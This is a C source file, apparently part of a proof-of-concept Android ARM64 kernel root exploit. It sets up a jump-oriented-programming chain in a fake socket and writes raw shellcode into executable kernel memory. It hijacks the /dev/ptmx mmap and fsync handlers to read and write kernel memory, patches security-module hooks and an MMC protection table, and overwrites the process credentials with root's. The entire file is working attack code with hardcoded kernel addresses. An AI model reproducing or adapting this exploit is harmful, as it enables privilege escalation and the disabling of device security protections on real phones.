#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include "poc.h"

#define PAGE_START_ADDRESS(m,s) (((addr_t)(m)) & ~((s) - 1))
#define PAGE_END_ADDRESS(m,s)   (((addr_t)(m)) | ((s) - 1))

#define OFFSET_SK_PROT          0x28
#define OFFSET_SK_STAMP         0x1f8
#define OFFSET_MC_LIST          0x2b0

#define MIN_SK_SIZE             (OFFSET_MC_LIST + sizeof (addr_t))

#define STORE_JOP_RESULT        680

#define NUM_JOP_FUNC            3

#define KERNEL_BASE	        0xffffffc000000000L
#define KERNEL_SIZE             0x0000000002000000L

#define VMALLOC_ADDRESS_DUMMY   0xffffff80ffffffffL

#define PTMX_FOPS               0xffffffc001923410L
#define FOPS_MMAP_OFFSET        10
#define FOPS_FSYNC_OFFSET       14

#define MMAP_ADDRESS            0x0000000020000000L

#define ARRAY_SIZE(x)           (sizeof (x) / sizeof (*(x)))


static addr_t kernel_stack;
static addr_t *exec_addr_ptr;
static addr_t exec_addr;

static addr_t kernel_mmap_hander;
static addr_t kernel_cred_hander;
static addr_t protect_socket_hander;

static int num_sockets_protected;


addr_t
get_sk_timestamp_offset(void)
{
  return OFFSET_SK_STAMP;
}

int
get_num_jop_func(void)
{
  return NUM_JOP_FUNC;
}

int
setup_jop_chain(addr_t sk, int func_num)
{
  addr_t page_start;
  addr_t page_end;
  addr_t kernel_func;
  addr_t prot_user;
  addr_t offset;
  size_t pagesize;
  static unsigned char work_buf[1024];
  addr_t work;
  addr_t *p;

  work = (addr_t)work_buf;

  pagesize = get_page_size();

  page_start = PAGE_START_ADDRESS(sk, pagesize);
  page_end = PAGE_END_ADDRESS(sk + MIN_SK_SIZE, pagesize);

  memset((void *)page_start, 0, (page_end + 1) - page_start);

  switch (func_num) {
  case 0:
    kernel_func = (addr_t)0xffffffc00041b1d0L;

    p = (addr_t *)(sk + 8);
    *p = 0xffffffc000272eccL;

    p = (addr_t *)(sk + 16);
    *p = 0xffffffc00024a988L;

    p = (addr_t *)(sk + 64);
    *p = work;

    p = (addr_t *)(work + 8);
    *p = 0xffffffc000b70484L;

    p = (addr_t *)(sk + STORE_JOP_RESULT);
    *p = 0;

    break;

  case 1:
    kernel_func = (addr_t)0xffffffc00050ff54L;

    p = (addr_t *)(sk + 208);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 320);
    *p = work;

    p = (addr_t *)(sk + 80);
    *p = 0xffffffc00041fd58L;

    p = (addr_t *)(sk + 24);
    *p = get_ptr_addr_limit(kernel_stack) - 56;

    p = (addr_t *)(sk + 56);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 88);
    *p = work;

    p = (addr_t *)(work + 16);
    *p = 0xffffffc000b70484L;

    break;

  case 2:
    kernel_func = (addr_t)0xffffffc00050ff54L;

    p = (addr_t *)(sk + 208);
    *p = (addr_t)-1L;

    p = (addr_t *)(sk + 320);
    *p = work;

    p = (addr_t *)(sk + 24);
    *p = 4096;

    p = (addr_t *)(sk + 80);
    *p = 0xffffffc0002fef74L;

    p = (addr_t *)(sk + 48);
    *p = 0xffffffc0002e715cL;

    p = (addr_t *)(sk + 88);
    *p = 0xffffffc000b55290L;

    p = (addr_t *)(sk + 1024);
    *p = work;

    p = (addr_t *)(work + 72);
    *p = 0xffffffc000b70484L;

    exec_addr_ptr = (addr_t *)(sk + 1400);
    *exec_addr_ptr = VMALLOC_ADDRESS_DUMMY;

    break;

  default:
    kernel_func = (addr_t)0xffffffc000b70484L;
  }

  prot_user = page_start;
  offset = sk - page_start;

  if (offset < sizeof (addr_t)) {
    prot_user = (page_end + 1) - sizeof (addr_t);
  }

  p = (addr_t *)(sk + OFFSET_SK_PROT);
  *p = prot_user;

  p = (addr_t *)prot_user;
  *p = kernel_func;

  return 0;
}

static int build_fops_handlers(void);
static int set_kernel_cred(void);

void
func_after_jop(addr_t sk, int func_num)
{
  switch (func_num) {
  case 0:
    kernel_stack = *(addr_t *)(sk + STORE_JOP_RESULT);
    break;

  case 1:
    break;

  case 2:
    exec_addr = *exec_addr_ptr;
    if (exec_addr == VMALLOC_ADDRESS_DUMMY) {
      printf("vmalloc_exec(): failed\n");
      break;
    }

    if (build_fops_handlers() == -1) {
      break;
    }

    if (set_kernel_cred() == -1) {
      break;
    }

    break;

  default:
    break;
  }
}

int
is_socket_protection_enabled(void)
{
  if (num_sockets_protected > 0) {
    return 1;
  }

  return 0;
}

const unsigned int kernel_mmap_func[] = {
  0xaa0103e0,
  0xd2979805,
  0xa9bf7bfd,
  0xf2a005a5,
  0xd2800002,
  0x910003fd,
  0xf9400021,
  0xf2dff805,
  0xf9400403,
  0xf2ffffe5,
  0xf9402404,
  0xcb010063,
  0xd63f00a0,
  0xa8c17bfd,
  0xd65f03c0,
  0
};

const unsigned int kernel_cred_func[] = {
  0xd284d701,
  0xd2800000,
  0xa9bf7bfd,
  0xf2a00481,
  0xf2dff801,
  0x910003fd,
  0xf2ffffe1,
  0xd63f0020,
  0xd2846b01,
  0xf2a00481,
  0xf2dff801,
  0xf2ffffe1,
  0xd63f0020,
  0x910003e0,
  0x12800001,
  0x9272c400,
  0xf9400800,
  0xf9426400,
  0xb9002801,
  0xb9002c01,
  0xb9003001,
  0xb9003401,
  0xb9003801,
  0xb9003c01,
  0xb9004001,
  0xb9004401,
  0x52800000,
  0xa8c17bfd,
  0xd65f03c0,
  0
};

const unsigned int protect_socket_func[] = {
  0xa9bd7bfd,
  0xd299f501,
  0x910003e0,
  0x910003fd,
  0x9272c400,
  0xa9025bf5,
  0xa90153f3,
  0xf2a01901,
  0x52800014,
  0xf9400800,
  0xf2dff801,
  0xf2ffffe1,
  0xf9444c13,
  0x91010275,
  0xaa1503e0,
  0xd63f0020,
  0xf9400676,
  0x2a1403f3,
  0xb94002c0,
  0x6b00027f,
  0x54000282,
  0xf94006c0,
  0xf873d800,
  0xb40001e0,
  0xd281eb01,
  0xf9401400,
  0xf2a01e61,
  0xf2dff801,
  0xf2ffffe1,
  0xeb01001f,
  0x54000101,
  0xd2998581,
  0x2a1303e0,
  0xf2a00601,
  0x11000694,
  0xf2dff801,
  0xf2ffffe1,
  0xd63f0020,
  0x11000673,
  0x17ffffeb,
  0xd29a4a81,
  0xaa1503e0,
  0xf2a01901,
  0xf2dff801,
  0xf2ffffe1,
  0xd63f0020,
  0x2a1403e0,
  0xa94153f3,
  0xa9425bf5,
  0xa8c37bfd,
  0xd65f03c0,
  0
};

static int
build_handler(addr_t handler, const void *binary, size_t size)
{
  if (write_kernel_memory_by_pipe(handler, binary, size) != size) {
    printf("build_handler(): write failed at 0x%08lx\n", handler);
    return -1;
  }

  return 0;
}

static int
build_fops_handlers(void)
{
  addr_t buf;

  buf = exec_addr;

  if (build_handler(buf, kernel_mmap_func, sizeof kernel_mmap_func) != 0) {
    return -1;
  }
  kernel_mmap_hander = buf;
  buf += sizeof kernel_mmap_func;

  if (build_handler(buf, kernel_cred_func, sizeof kernel_cred_func) != 0) {
    return -1;
  }
  kernel_cred_hander = buf;
  buf += sizeof kernel_cred_func;

  if (build_handler(buf, protect_socket_func, sizeof protect_socket_func) != 0) {
    return -1;
  }
  protect_socket_hander = buf;

  return 0;
}

static addr_t
convert_kernel_to_mapped_address(addr_t addr)
{
  return addr - KERNEL_BASE + MMAP_ADDRESS;
}

static addr_t
read_kernel(addr_t addr)
{
  addr_t *p;

  p = (addr_t *)convert_kernel_to_mapped_address(addr);
  return *p;
}

static void
write_kernel(addr_t addr, addr_t value)
{
  addr_t *p;

  p = (addr_t *)convert_kernel_to_mapped_address(addr);
  *p = value;
}

static int
unlock_lsm(int fd)
{
  addr_t addr;
  addr_t save;

  write_kernel(0xffffffc000e32950, 0xffffffc0003fa770);
  write_kernel(0xffffffc000e32998, 0xffffffc0003fa858);
  write_kernel(0xffffffc000e329b0, 0xffffffc0003fa878);
  write_kernel(0xffffffc000e329c0, 0xffffffc0003fa888);
  write_kernel(0xffffffc000e32b70, 0xffffffc0003f7a48);

  write_kernel(0xffffffc0004120bc, 0xd65f03c052800000);
  write_kernel(0xffffffc00041211c, 0xd65f03c052800000);
  write_kernel(0xffffffc000412324, 0xd65f03c052800000);
  write_kernel(0xffffffc0004128f0, 0xd65f03c052800000);
  write_kernel(0xffffffc00041277c, 0xd65f03c052800000);

  write_kernel(0xffffffc00040d5b8, 0x9107e2a014000086);
  write_kernel(0xffffffc00040d834, 0x9107e2a014000033);

  addr = PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (addr_t);
  save = read_kernel(addr);
  write_kernel(addr, 0xffffffc0003fa6c4);
  fsync(fd);
  write_kernel(addr, save);

  return 0;
}

static int
unlock_mmc(int fd)
{
  write_kernel(0xffffffc000ea8c10, 0x200000000);
  write_kernel(0xffffffc000ea8c18, 0x200000005);
  write_kernel(0xffffffc000ea8c20, 0x200000009);
  write_kernel(0xffffffc000ea8c28, 0x20000000a);
  write_kernel(0xffffffc000ea8c30, 0x20000000b);
  write_kernel(0xffffffc000ea8c38, 0x20000000c);
  write_kernel(0xffffffc000ea8c40, 0x20000000d);
  write_kernel(0xffffffc000ea8c48, 0x20000000e);
  write_kernel(0xffffffc000ea8c50, 0x20000000f);
  write_kernel(0xffffffc000ea8c58, 0x200000010);
  write_kernel(0xffffffc000ea8c60, 0x200000011);
  write_kernel(0xffffffc000ea8c68, 0x200000012);
  write_kernel(0xffffffc000ea8c70, 0x200000013);
  write_kernel(0xffffffc000ea8c78, 0x200000014);
  write_kernel(0xffffffc000ea8c80, 0x200000015);
  write_kernel(0xffffffc000ea8c88, 0x200000016);
  write_kernel(0xffffffc000ea8c90, 0x200000017);
  write_kernel(0xffffffc000ea8c98, 0x200000018);
  write_kernel(0xffffffc000ea8ca0, 0x200000019);
  write_kernel(0xffffffc000ea8ca8, 0x20000001a);
  write_kernel(0xffffffc000ea8cb0, 0x20000001b);
  write_kernel(0xffffffc000ea8cb8, 0x20000001d);
  write_kernel(0xffffffc000ea8cc0, 0x20000001e);
  write_kernel(0xffffffc000ea8cc8, 0x20000001f);

  return 0;
}

static void
get_kernel_cred(int fd)
{
  addr_t addr;

  addr = PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (addr_t);
  write_kernel(addr, kernel_cred_hander);

  fsync(fd);

  write_kernel(addr, 0);
}

static void
protect_socket(int fd)
{
  addr_t addr;
  int ret;

  addr = PTMX_FOPS + FOPS_FSYNC_OFFSET * sizeof (addr_t);
  write_kernel(addr, protect_socket_hander);

  ret = fsync(fd);
  if (ret > 0) {
    num_sockets_protected = ret;
    printf("%d sockets are protected\n", num_sockets_protected);
  }

  write_kernel(addr, 0);
}

static int
set_kernel_cred(void)
{
  void *mmap_address;
  addr_t fops_mmap;
  int fd;

  fops_mmap = PTMX_FOPS + FOPS_MMAP_OFFSET * sizeof (addr_t);

  if (write_kernel_memory_by_pipe(fops_mmap, &kernel_mmap_hander, sizeof kernel_mmap_hander) != sizeof kernel_mmap_hander) {
    printf("Failed to write mmap handler\n");
    return -1;
  }

  fd = open("/dev/ptmx", O_RDWR);
  if (fd == -1) {
    perror("ptmx open");
    return -1;
  }

  mmap_address = mmap((void *)MMAP_ADDRESS, KERNEL_SIZE,
                      PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
                      fd, 0);

  if (mmap_address == MAP_FAILED) {
    perror("ptmx mmap");
    close(fd);
  }

  unlock_lsm(fd);
  unlock_mmc(fd);

  get_kernel_cred(fd);

  protect_socket(fd);

  write_kernel(fops_mmap, 0);

  munmap(mmap_address, KERNEL_SIZE);
  close(fd);

  return 0;
}
